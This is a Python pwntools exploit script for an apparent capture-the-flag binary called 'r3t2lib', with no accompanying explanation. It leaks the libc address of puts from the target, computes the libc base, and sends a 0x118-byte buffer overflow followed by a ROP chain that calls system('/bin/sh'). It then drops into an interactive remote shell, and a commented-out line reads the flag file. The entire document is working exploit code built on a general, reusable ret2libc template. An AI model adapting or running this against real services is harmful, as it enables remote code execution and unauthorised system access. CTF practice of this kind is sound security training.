#!/usr/bin/python3

from pwn import *
import sys

# change those
BINARY = './r3t2lib'
LIBC = './libc.so.6'
HOST = '140.110.112.77'
PORT = 2123

context.binary = BINARY
e = ELF( BINARY )
libc = 0

if len(sys.argv) > 1:
    r = remote( HOST, PORT )
    if LIBC != '':
        libc = ELF( LIBC )
else: 
    r = process( BINARY )
    if LIBC != '':
        pass
        libc = ELF( '/lib/x86_64-linux-gnu/libc.so.6' )

stdout = 0x601060
stdout = 0x601018

r.sendline(hex(stdout))
r.recvuntil('address : ')

#libc_base = int(r.recvline()[:-1], 16) - libc.symbols['_IO_2_1_stdout_']
libc_base = int(r.recvline()[:-1], 16) - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']

pop_rdi_ret = 0x0000000000400843
binsh = libc_base + 0x000000000018ce17
ret = libc_base + 0x0000000000000937 

log.info("libc_base = " + hex(libc_base))
log.info("system_addr = " + hex(system_addr))
r.sendline(b'A'*0x118 + p64(pop_rdi_ret) + p64(binsh) + p64(system_addr))

#r.sendline('cat /home/`whoami`/flag')
r.interactive()
